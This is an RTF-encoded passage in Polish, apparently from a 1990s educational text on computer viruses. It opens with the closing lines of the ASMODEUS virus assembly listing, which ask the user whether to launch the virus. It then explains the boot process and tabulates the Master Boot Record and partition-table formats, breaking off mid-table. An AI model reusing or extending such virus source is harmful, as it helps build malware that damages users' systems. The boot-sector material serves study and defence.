\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Czesc Informayjna}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Informacja:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,09h                           ; funkcja DOS - wyswietl tekst$}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,01h                           ; funkcja DOS - czytaj znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; ze standardowego wejscia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   21h                              ; wywolaj funkcje DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; AL zawiera znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; zapamietaj na chwile znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,0E0Dh                         ; \\  przejdz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ;  \\ do}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,0E0Ah                         ;  / nastepnej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ; /  linii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ax                               ; przywroc znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   al,11011111b                     ; konwertuj znak na wielka litere}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   al,'T'                           ; czy potwierdzona infekcja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     clc                                    ; ustaw flage na TAK}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    CLCRet                           ; TAK i powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     stc                                    ; ustaw flage na NIE i powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CLCRet:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeInformacja db CR,LF,'ASMODEUS v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF,'Czy chcesz uruchomic wirusa (T/N) ?'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db DOLAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusEnd:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch    Bufor     db 32768 dup (?)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ASMODEUS ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END VirusStart}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.2. Sektory systemowe}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Po uruchomieniu komputera oraz po pozytywnym przej\uc1\u347\'9cciu sprz\uc1\u281\'eatowej inicjalizacji wszystkich uk\uc1\u322\'b3ad\'f3w, procesor przyst\uc1\u281\'eapuje do uruchamiania systemu, oddaj\uc1\u261\'b9c najpierw sterowanie do BIOS-a, kt\'f3ry po przeprowadzeniu r\'f3\uc1\u380\'bfnych test\'f3w przekazuje kontrol\uc1\u281\'ea dalej, tzn. do systemu operacyjnego. Aby to zrobi\uc1\u263\'e6, musi wczyta\uc1\u263\'e6 go z pliku zawieraj\uc1\u261\'b9cego}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}j\uc1\u261\'b9dro systemu. Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf narzucona przez systemy operacyjne struktura plik\'f3w (r\'f3\uc1\u380\'bfna dla r\'f3\uc1\u380\'bfnych system\'f3w) jest dost\uc1\u281\'eapna dopiero po za\uc1\u322\'b3adowaniu odpowiedzialnego za dost\uc1\u281\'eap do niej j\uc1\u261\'b9dra systemu (tak\uc1\u380\'bfe r\'f3\uc1\u380\'bfnego dla r\'f3\uc1\u380\'bfnych system\'f3w), powstaje b\uc1\u322\'b3\uc1\u281\'eadn}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} ko\uc1\u322\'b3o: aby za\uc1\u322\'b3adowa\uc1\u263\'e6 plik z j\uc1\u261\'b9drem systemu, ono samo musi ju\uc1\u380\'bf by\uc1\u263\'e6 za\uc1\u322\'b3adowane. Jasne jest, i\uc1\u380\'bf musi istnie\uc1\u263\'e6 jaka\uc1\u347\'9c uniwersalna metoda na za\uc1\u322\'b3adowanie dowolnego systemu (a wi\uc1\u281\'eac i j\uc1\u261\'b9dra systemu). Problem ten rozwi\uc1\u261\'b9zano poprzez nadanie specjalnego znaczenia pier}{\f1\fs24\lang1045{\*\listtag0}w}{\f0\fs24\lang1045{\*\listtag0}szym sektorom dysk\'f3w fizycznych i logicznych. Sektory te zawieraj\uc1\u261\'b9 kr\'f3tkie programy, odpowiedzialne za za\uc1\u322\'b3adowanie w\uc1\u322\'b3a\uc1\u347\'9cciwej cz\uc1\u281\'ea\uc1\u347\'9cci j\uc1\u261\'b9dra systemu. W przypadku dysku fizycznego mamy do czynienia z tzw. G\uc1\u322\'b3\'f3wnym Rekordem \uc1\u321\'a3aduj\uc1\u261\'b9cym, a w przypadku logicznych -}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}z tzw. BOOT-sektorem. Dok\uc1\u322\'b3adniejszy ich opis znajduje si\uc1\u281\'ea dalej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.2.1. G\uc1\u322\'b3\'f3wny Rekord \uc1\u321\'a3aduj\uc1\u261\'b9cy (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}Master Boot Record-MBR}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ka\uc1\u380\'bfdy dysk twardy zawiera w swym pierwszym fizycznym (tzn. z punktu widzenia dost\uc1\u281\'eapu przez BIOS) sektorze tzw. G\uc1\u322\'b3\'f3wny Rekord \uc1\u321\'a3aduj\uc1\u261\'b9cy (cz\uc1\u281\'easto nazywany sektorem tablicy partycji), zawieraj\uc1\u261\'b9cy informacje o podziale jego fizycznej struktury na logiczne party-cje (strefy). Opr\'f3cz powy\uc1\u380\'bfszych informacji rekord ten zawiera tak\uc1\u380\'bfe kr\'f3tki programik, maj\uc1\u261\'b9cy na celu odnalezienie w tablicy party}{\f1\fs24\lang1045{\*\listtag0}c}{\f0\fs24\lang1045{\*\listtag0}ji aktywnej strefy i za\uc1\u322\'b3adowanie z niej systemu operacyjnego. Format g\uc1\u322\'b3\'f3wnego rekordu \uc1\u322\'b3aduj\uc1\u261\'b9cego, opis zawarto\uc1\u347\'9cci tablicy partycji oraz rodzaje stref zawarte s\uc1\u261\'b9 w poni\uc1\u380\'bfszych tablicach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Format g\uc1\u322\'b3\'f3wnego rekordu \uc1\u322\'b3aduj\uc1\u261\'b9cego (MBR)}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7175in/5.8710in/; table-sdh:8928448}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Program w}{\f0\fs24\lang1045{\*\listtag0}czytuj\uc1\u261\'b9cy system z aktywnej partycji dysku twardego}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1BE}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis strefy nr 1}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1CE}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis strefy nr 2}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1DE}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis strefy nr 3}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1EE}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis strefy nr 4}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1FE}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Bajty 055h i 0AAh}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Opis jednej strefy w tablicy partycji}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.8154in/5.7731in/; table-sdh:894b780}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Znacznik aktywno\uc1\u347\'9c}{\f1\fs24\lang1045{\*\listtag0}ci strefy: 00h - strefa nie zawiera systemu operacyjnego 80h - strefa zawiera system operacyjny}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Numer g\uc1\u322\'b3owicy, pod kt\'f3r\uc1\u261\'b9 zaczyna si\uc1\u281\'ea strefa}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02-03}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Numer cylindra i sektora, pod kt\'f3rymi zaczyna si\uc1\u281\'ea strefa, zapisane nast\uc1\u281\'eapuj\uc1\u261\'b9co (litery odpowiadaj\uc1\u261\'b9}{\f1\fs24\lang1045{\*\listtag0} kolejnym bitom):}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bajt spod adresu 02h: CCssssss bajt spod adresu 03h: cccccccc ssssss = numer sektora (0-63) CCcccccccc = numer cylindra (0-1023)}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}04}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Rodzaj strefy (wg nast\uc1\u281\'eapnej tablicy) }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}05}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Numer g\uc1\u322\'b3owicy, pod kt\'f3r\uc1\u261\'b9 ko\uc1\u324\'f1czy si\uc1\u281\'ea strefa}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}06-07}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Numer cylindr}{\f0\fs24\lang1045{\*\listtag0}a i sektora, pod kt\'f3rymi ko\uc1\u324\'f1czy si\uc1\u281\'ea strefa, zapisane tak samo jak w polu 02h-03h}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}08-0B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Wzgl\uc1\u281\'eadny numer sektora rozpoczynaj\uc1\u261\'b9cego stref\uc1\u281\'ea }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0C-0F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}D\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 strefy w sektorach}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rodzaje stref wg bajtu z pola 04h w opisie strefy}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:4.0640in/; table-sdh:894dd50}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Bajt    Rodzaj strefy}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00h    pusta}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01h    DOS 12-bit FAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx5796
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}02h    XENIX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
